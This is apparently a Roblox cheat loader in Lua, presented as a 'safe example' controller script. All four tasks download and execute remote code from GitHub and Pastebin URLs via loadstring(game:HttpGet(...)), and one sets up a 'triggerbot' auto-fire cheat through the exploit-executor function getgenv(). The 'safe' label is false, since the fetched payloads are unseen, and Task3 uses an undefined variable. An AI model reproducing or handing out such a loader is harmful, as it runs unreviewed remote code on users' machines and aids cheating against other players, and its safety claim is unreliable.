-- Single controller script that runs four tasks once
-- Safe example — no loops, no GUI
-- Put this in StarterPlayerScripts (LocalScript)

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- 🟩 Task 1: Executes once
local function Task1()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Rons.lua"))()
	task.wait(1)
	print("[Task1] finished")
end

-- 🟦 Task 2: Executes once
local function Task2()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Lock.lua"))()
	task.wait(0.5)
	print("[Task2] finished")
end

-- 🟨 Task 3: Executes once (different logic)
local function Task3()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/We.lua"))()
	print("[Task3] Character name:", char.Name)
	print("[Task3] finished")
end

-- 🟥 Task 4: Executes once
local function Task4()
	getgenv().triggerbot = getgenv().triggerbot or {
    Enabled = true,
    TriggerCooldown = 0.10,
    BlacklistedTools = {
        ["Knife"] = true -- Add more tools if needed
    }
}
loadstring(game:HttpGet("https://pastebin.com/raw/amX8jTrR"))()
	task.wait(0.2)
	print("[Task4] finished")
end

-- Helper to safely start each task
local function safeSpawn(fn)
	task.spawn(function()
		local ok, err = pcall(fn)
		if not ok then
			warn("Task error:", err)
		end
	end)
end

-- Run all four tasks once at the same time
safeSpawn(Task1)
safeSpawn(Task2)
safeSpawn(Task3)
safeSpawn(Task4)

print("✅ All four tasks executed once")
